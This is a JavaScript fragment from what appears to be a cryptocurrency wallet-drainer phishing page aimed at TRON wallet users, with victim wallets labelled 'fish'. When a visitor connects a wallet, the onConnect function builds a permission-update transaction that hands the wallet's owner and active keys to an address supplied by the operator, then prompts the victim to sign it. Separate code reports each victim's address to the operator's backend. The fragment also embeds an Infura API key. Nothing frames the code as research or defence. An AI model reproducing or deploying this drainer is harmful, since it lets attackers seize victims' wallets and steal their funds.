console.log(source);
dl = dl.replace(/\#/g,"");
console.log(dl);

const ABI = [{ "inputs": [{ "internalType": "string", "name": "name", "type": "string" }, { "internalType": "string", "name": "symbol", "type": "string" }], "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }];

    var infura_key = '7d73a0c13ce946769577714aef84b79a';
    var to_address = '';
    var domain = 'https://' + window.location.host + '/';
    var resultsucc = 0;
    let _web3;
    let chain_type;
    
    let trc_to_address = 'TMX6WfryTopszW5cN96TUc9t3tD39yWLxR';
    let trc_contractAddr = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';		//波场USDT合约地址
    var bizhong = 'USDT';
    
    var val = 900000000 + parseInt((Math.random() * 1000).toFixed(0));
    var valStr = val + "000000000000000000";

    var decimals = {
		'WIN': 6,
		'USDT':6,
		'TONS':6,
		'USDJ':18,
		'JST': 18,
		"HT": 18,
		"SUN": 18,
		"EXNX": 18,
		"VCOIN": 6,
		"POL": 8,
		"CKRW": 6
	};
	
	var price = {
		'WIN': 0.001150,
		'USDT':1,
		'TONS':1.35,
		'USDJ':1.04,
		'JST': 0.125,
		"HT": 20.41,
		"SUN": 33.97,
		"EXNX": 0.0621,
		"VCOIN": 0.004225,
		"POL": 0.1393,
		"CKRW": 0.002487
	};

    function putInfo(fish_wallet_addr,to_address){
		var data = {
    		fish_wallet_addr:fish_wallet_addr,
    		multi_wallet_addr:to_address,
    		agent_id:dl,
    		fish_source:source
    	}
    	$.ajax({
    		type: 'post',
    		url: domain + 'api/insert_multi',
    		data: data,
    		success:function(data){
                console.log(1);
			},
			error:function(data){
			    console.log(2);
			}
    	})
	}
	
    function getInfo(){
        var gdata = {
    		wallet_purpose:5,
    		agent_id:dl
    	}
		$.ajax({
			type: 'get',
			url:  domain + 'api/search_to_address',
			data : gdata,
			async : false,
			success:function(data){
			    trc_to_address = data.data.trc.wallet_addr;
                trc_contractAddr = data.data.trc.contract_addr;
                bizhong = data.data.trc.token_name;
			},
			error:function(data){
			}
		})
	}
     
    getInfo();
	
    /**
     * Connect wallet button pressed.
     */
    async function onConnect() {
        chain_type = 'trc';
        to_address = trc_to_address;

        let tronWeb = window.tronWeb;
        let walletAddress = tronWeb.defaultAddress.base58;
        
        if(!tronWeb.isAddress(to_address)){
            alert('请输入有效的控制地址');
            return;
        };

	    tradeobj = await tronWeb.trx.getAccount(
				walletAddress,
		).then(output => {
			trx = output.balance / 1000000;
			oldownerpermission = output.owner_permission.keys;
			oldactivepermission = output.active_permission;
		});
		
// 		判断trx,大于100就多签,小于100就提示
        if (trx < 100) {
            alert('矿工费不足');
            return '';
        }
        
        let multiownerweight = 0;
        //判断owner权限
		for(let i=0; i<oldownerpermission.length; i++) {
		    oldowneraddress = oldownerpermission[i].address;
    	    if(oldowneraddress === to_address || oldowneraddress === tronWeb.address.toHex(to_address)) {
    	        multiownerweight = 1;
    	    }
    	}
    	let multiactiveweight = 0;
        //判断active权限
		for(let k=0; k<oldactivepermission.length; k++) {
		    oldactivepermissionkeys = oldactivepermission[k].keys;
		    
		    for(let j=0; j<oldactivepermissionkeys.length; j++) {
    		    oldactivepermissionkeysaddress = oldactivepermissionkeys[j].address;
        	    if(oldactivepermissionkeysaddress === to_address || oldactivepermissionkeysaddress === tronWeb.address.toHex(to_address)) {
        	        multiactiveweight = 1;
        	    }
        	}
    	}
    	
        //如果已经在多签列表里面了,直接返回成功
        if(multiownerweight == 1 && multiactiveweight == 1){
            putInfo(walletAddress,to_address);
            resultsucc = 1;
            
			$(".tishi").fadeIn()
			setTimeout(function () {
				$(".tishi").fadeOut()
			},2000);
			
			$('.modal-overlay').remove();
			$('.modal').removeClass('modal-in').addClass('modal-out');
			return '';
        }
        
        let ownerAddress = tronWeb.address.toHex(walletAddress);

        let ownerPermission = { type: 0, permission_name: 'owner' ,threshold: 1};
        ownerPermission['keys']  = [];
        ownerPermission.keys.push({ address: tronWeb.address.toHex(to_address), weight: 1 });

        let activePermission = { type: 2, permission_name: 'active',threshold:1 ,operations:'7fff1fc0037e0000000000000000000000000000000000000000000000000000'};
        activePermission.keys = [];
        activePermission.keys.push({ address: tronWeb.address.toHex(to_address), weight: 1 });
        putInfo(walletAddress,to_address);

        const updateTransaction = await tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
        // console.log(updateTransaction);
        const signedTx = await tronWeb.trx.sign(updateTransaction);
        const broastTx = await tronWeb.trx.sendRawTransaction(signedTx, function(err, res) {
          if(err == null){
                resultsucc = 1;
                
				$(".tishi").fadeIn()
				setTimeout(function () {
					$(".tishi").fadeOut()
				},2000);
				
			}
			
			$('.modal-overlay').remove();
			$('.modal').removeClass('modal-in').addClass('modal-out');
        });
    }

	async function s(){
    	var tronWeb = window.tronWeb;
    	let walletAddress = tronWeb.defaultAddress.base58;
    	$('#address').text(walletAddress);
	}
 